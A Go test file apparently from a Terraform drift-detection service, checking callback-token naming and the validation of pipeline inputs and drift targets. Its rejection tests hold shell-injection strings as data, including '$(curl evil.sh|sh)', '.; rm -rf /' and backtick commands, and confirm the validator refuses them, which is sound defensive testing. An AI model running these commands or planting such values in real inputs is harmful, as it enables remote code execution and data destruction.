package api

import (
	"fmt"
	"strings"
	"testing"
)

// TestFanOutCallbackTokenVariableName is the Go half of the Phase 1b item 3
// equivalence proof (the YAML half is
// TestFanOutCallbackTokenVariableTemplateExpression_MatchesGoFunction in
// drift_workflows_test.go): it tables this function over every working_dir
// shape reWorkingDir permits -- including the empty string, "/" alone,
// nested paths, dots, hyphens, and leading/trailing separators -- pinning
// that the transform is exactly "cb_token_" + strings.ReplaceAll(workingDir,
// "/", "_"), which is what the template's replace(t.working_dir, '/', '_')
// must also compute (ADO's replace() is documented as an unconditional,
// all-occurrences substring replace, matching strings.ReplaceAll exactly).
func TestFanOutCallbackTokenVariableName(t *testing.T) {
	cases := []struct{ workingDir, want string }{
		{"", "cb_token_"},
		{".", "cb_token_."},
		{"/", "cb_token__"},
		{"app1", "cb_token_app1"},
		{"app1/", "cb_token_app1_"},
		{"/app1", "cb_token__app1"},
		{"envs/prod/app", "cb_token_envs_prod_app"},
		{"envs/prod/app/", "cb_token_envs_prod_app_"},
		{"a.b-c_d", "cb_token_a.b-c_d"},
		{"team-a/app", "cb_token_team-a_app"},
		{"a//b", "cb_token_a__b"},
	}
	for _, tc := range cases {
		t.Run(tc.workingDir, func(t *testing.T) {
			if got := FanOutCallbackTokenVariableName(tc.workingDir); got != tc.want {
				t.Errorf("FanOutCallbackTokenVariableName(%q) = %q, want %q", tc.workingDir, got, tc.want)
			}
		})
	}
}

func TestValidatePipelineInputs_Valid(t *testing.T) {
	cases := []struct {
		name             string
		workingDir       string
		repoRef          string
		tfVersion        string
		registryHost     string
		providerVersions map[string]string
		moduleVersions   map[string]string
	}{
		{name: "empty", providerVersions: map[string]string{}, moduleVersions: map[string]string{}},
		{name: "typical", workingDir: "envs/prod", repoRef: "release/1.2", tfVersion: "1.9.5", registryHost: "registry.example.com:8443",
			providerVersions: map[string]string{"aws": ">= 5.40, < 6.0", "azurerm": "~> 3.0"},
			moduleVersions:   map[string]string{"network-core": "2.1.0"}},
		{name: "latest", tfVersion: "latest"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePipelineInputs(tc.workingDir, tc.repoRef, tc.tfVersion, tc.registryHost, tc.providerVersions, tc.moduleVersions); err != nil {
				t.Fatalf("expected valid, got error: %v", err)
			}
		})
	}
}

// TestValidateDriftTargets_Valid pins the accepted shapes: a handful of
// distinct targets, and any number of "untracked" targets (empty source_id AND
// state_key) which are exempt from the duplicate check because there is no
// detection identity to collide on.
func TestValidateDriftTargets_Valid(t *testing.T) {
	cases := []struct {
		name  string
		items []DriftTargetItem
	}{
		{name: "empty", items: nil},
		{name: "one legacy-shaped item", items: []DriftTargetItem{{SourceID: "s1", StateKey: "app.tfstate", WorkingDir: "infra/"}}},
		{name: "several distinct targets", items: []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
			{SourceID: "s1", StateKey: "app2.tfstate", WorkingDir: "app2/"},
			{SourceID: "s2", StateKey: "app1.tfstate", WorkingDir: "app3/"},
		}},
		{name: "many untracked targets (no source_id/state_key) are not duplicates of each other", items: []DriftTargetItem{
			{WorkingDir: "a/"}, {WorkingDir: "b/"}, {WorkingDir: "c/"},
		}},
		{name: "exactly the cap", items: makeDriftTargetItems(maxDriftTargets)},
		{name: "params within the cap and character allowlist", items: []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: map[string]string{
				"service_connection": "sc-app1", "backend_container": "tfstate.prod", "region-2": "us-east-1",
			}},
		}},
		{name: "params exactly at the cap", items: []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: makeDriftTargetParams(maxDriftTargetParams)},
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validateDriftTargets(tc.items); err != nil {
				t.Fatalf("expected valid, got error: %v", err)
			}
		})
	}
}

func makeDriftTargetItems(n int) []DriftTargetItem {
	items := make([]DriftTargetItem, n)
	for i := range items {
		items[i] = DriftTargetItem{SourceID: "s1", StateKey: fmt.Sprintf("app%d.tfstate", i), WorkingDir: fmt.Sprintf("app%d/", i)}
	}
	return items
}

// makeDriftTargetParams builds a Params map of exactly n valid entries, for
// the "at the cap" / "over the cap" pair of TestValidateDriftTargets cases.
func makeDriftTargetParams(n int) map[string]string {
	m := make(map[string]string, n)
	for i := 0; i < n; i++ {
		m[fmt.Sprintf("key%d", i)] = fmt.Sprintf("value%d", i)
	}
	return m
}

// TestValidateDriftTargets_Rejects pins the three refusals: a per-item
// injection attempt, more than maxDriftTargets items, and a repeated
// (source_id, state_key) pair within one request.
func TestValidateDriftTargets_Rejects(t *testing.T) {
	t.Run("injection in one item's working_dir", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
			{SourceID: "s1", StateKey: "app2.tfstate", WorkingDir: "$(curl evil.sh|sh)"},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for shell-hostile working_dir")
		}
	})
	t.Run("over the cap", func(t *testing.T) {
		if err := validateDriftTargets(makeDriftTargetItems(maxDriftTargets + 1)); err == nil {
			t.Fatal("expected rejection for exceeding maxDriftTargets")
		}
	})
	t.Run("duplicate source_id+state_key", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/"},
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1-again/"},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for a duplicate (source_id, state_key) pair")
		}
	})
	// state_key is embedded in the "targets" CI template parameter under
	// fan-out, so shell/YAML-hostile characters are refused -- while keys
	// that are merely looser than a directory name stay legal.
	t.Run("hostile characters in state_key", func(t *testing.T) {
		for _, key := range []string{
			"app.tfstate\"; curl evil.sh|sh #",
			"app`id`.tfstate",
			"$(whoami).tfstate",
			"app\n.tfstate",
			"app<x>.tfstate",
		} {
			items := []DriftTargetItem{{SourceID: "s1", StateKey: key, WorkingDir: "app/"}}
			if err := validateDriftTargets(items); err == nil {
				t.Errorf("expected rejection for state_key %q", key)
			}
		}
	})
	t.Run("legitimately loose state_key is accepted", func(t *testing.T) {
		for _, key := range []string{"env=prod/app.tfstate", "oci/APP1958.tfstate", "team a/app.tfstate", "app-1.2_3.tfstate"} {
			items := []DriftTargetItem{{SourceID: "s1", StateKey: key, WorkingDir: "app/"}}
			if err := validateDriftTargets(items); err != nil {
				t.Errorf("state_key %q should be accepted: %v", key, err)
			}
		}
	})
	t.Run("state_key over the length cap", func(t *testing.T) {
		items := []DriftTargetItem{{SourceID: "s1", StateKey: strings.Repeat("k", maxStateKeyLen+1), WorkingDir: "app/"}}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for an over-long state_key")
		}
	})
	// Phase 1b item 3: Params is validated with the same allowlist regex and
	// count cap every other pipeline input gets.
	t.Run("too many params", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: makeDriftTargetParams(maxDriftTargetParams + 1)},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for exceeding maxDriftTargetParams")
		}
	})
	t.Run("invalid params key", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: map[string]string{"service connection": "sc-1"}},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for a params key containing a space")
		}
	})
	t.Run("invalid params value", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "app1/", Params: map[string]string{"service_connection": "$(curl evil.sh|sh)"}},
		}
		if err := validateDriftTargets(items); err == nil {
			t.Fatal("expected rejection for a shell-hostile params value")
		}
	})
	// Phase 1b item 3, the highest-risk part of the change: two targets whose
	// working_dir derive the SAME Azure DevOps callback-token variable name
	// must be refused, not silently dispatched -- a collision there would
	// hand one app's one-shot callback token to the other app's report step.
	t.Run("two targets derive the same callback-token variable name", func(t *testing.T) {
		items := []DriftTargetItem{
			{SourceID: "s1", StateKey: "app1.tfstate", WorkingDir: "a/b"},
			{SourceID: "s2", StateKey: "app2.tfstate", WorkingDir: "a_b"},
		}
		err := validateDriftTargets(items)
		if err == nil {
			t.Fatal("expected rejection for two targets deriving the same callback-token variable name")
		}
		if !strings.Contains(err.Error(), "cb_token_a_b") {
			t.Errorf("error should name the colliding variable: %v", err)
		}
	})
}

func TestValidatePipelineInputs_RejectsInjection(t *testing.T) {
	cases := []struct {
		name             string
		workingDir       string
		repoRef          string
		tfVersion        string
		registryHost     string
		providerVersions map[string]string
		moduleVersions   map[string]string
	}{
		{name: "working_dir shell", workingDir: "$(curl evil.sh|sh)"},
		{name: "working_dir semicolon", workingDir: ".; rm -rf /"},
		{name: "working_dir backtick", workingDir: "`id`"},
		{name: "repo_ref injection", repoRef: "main\"; touch pwned; #"},
		{name: "tf_version space", tfVersion: "1.9.5 && id"},
		{name: "registry_host path", registryHost: "evil.com/x\"}}}#"},
		{name: "registry_host space", registryHost: "evil.com x"},
		{name: "provider name uppercase/quote", providerVersions: map[string]string{"aws\"": "1.0"}},
		{name: "provider version hcl breakout", providerVersions: map[string]string{"aws": "1.0\" }; provider \"x\" {"}},
		{name: "module name slash", moduleVersions: map[string]string{"net/work": "1.0"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if err := validatePipelineInputs(tc.workingDir, tc.repoRef, tc.tfVersion, tc.registryHost, tc.providerVersions, tc.moduleVersions); err == nil {
				t.Fatalf("expected rejection, got nil error")
			}
		})
	}
}
